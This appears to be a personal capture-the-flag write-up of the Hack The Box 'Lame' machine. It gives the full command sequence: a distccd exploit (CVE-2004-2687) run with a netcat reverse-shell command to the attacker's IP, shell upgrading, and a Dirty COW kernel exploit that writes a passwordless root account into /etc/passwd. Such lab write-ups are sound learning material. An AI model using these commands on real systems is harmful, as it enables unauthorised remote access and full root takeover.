# [[HTB - Lame]]  


# Resolution summary
- Both exploits are very common and known
- Weird issues with not being able to switch users with `su` command but was able to use a work around with `FTP`

## Improved skills
- Enumeration
- Compiling C Scripts 

## Used tools
- [[nmap]]
- [[searchsploit]]
-  [[FTP]]

# Exploitation
## distccd CVE-2004-2687
- Located an exploit written not using Metasploit that allows RCE
1. Pulled exploit from Github
```bash
wget https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/261b638bb05d02b67b6ad67fa9cf3c74a73de6c6/distccd_rce_CVE-2004-2687.py && mv distccd_rce_CVE-2004-2687.py exploit.py
```
2. Turned exploit into an executable with:
```bash
chmod +x exploit.py
```
3. Ran script as a test to see if we get access:
```bash
python2 exploit.py -t 10.129.127.104 -p 3632 -c "id"
```
- Note script says it should run with Python3 but doing so kept failing for me trying Python2 worked!!
4. Started a Listener:
```bash
sudo rlwrap nc -lvnp 3333
```
5. Finally lets tell the victims machine to call back to us with a shell:
```bash
python2 exploit.py -t 10.129.127.104 -p 3632 -c "nc 10.10.14.30 3333 -e /bin/sh"
```
6. Success we have a shell now we upgrade it to make it a bit more functional:
```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Run in the shell
export TERM=xterm-256color # whatever your original $TERM value is && Run in shell
ctrl + z
stty raw -echo ;fg # Run on our machine
```

# Privilege Escalation
## Local Enumeration
- Running `uname -a` shows the kernel version is vuln to **Dirty Cow** exploit!!

## Privilege Escalation vector
### Dirty Cow
- Want to avoid using Metasploit so searching came across the following exploit that creates a new root user named `firefart`
1. Start by downloading the exploit to our machine:
```bash
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
```
2. Next we need to get this onto the victim testing we do have access to `wget` on the victims machine so we start python server from our machine and pull it to the victim:
```bash
python3 -m http.server 9000
```
&&
```bash
wget http://10.10.10.10:9000/dirty.c
```
3. Now we need to compile this on the victims machine the script itself gives us in the notes what [[GCC]] command to use:
```bash
gcc -pthread dirty.c -o dirty -lcrypt
```
4. Final pre-step is to set this file to executable:
```bash
chmod +x dirty
```
5. Now we run this payload and pass it nothing for a password so we don't need one when signing into our new root user:
```bash
./dirty
```
- Note this might take a few minutes to complete and will look like the following when it completes give it time:
```bash
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 

Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: b7f04000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```
6. Normally we would switch users at this point but the `su firefart` wasn't working for me when I tried it would never bring the prompt up.
7. Instead went with the **FTP** port we found open earlier using our new account to sign into that worked perfect. Pulled the **root.txt** file onto our machine and finally full exploited the machine.
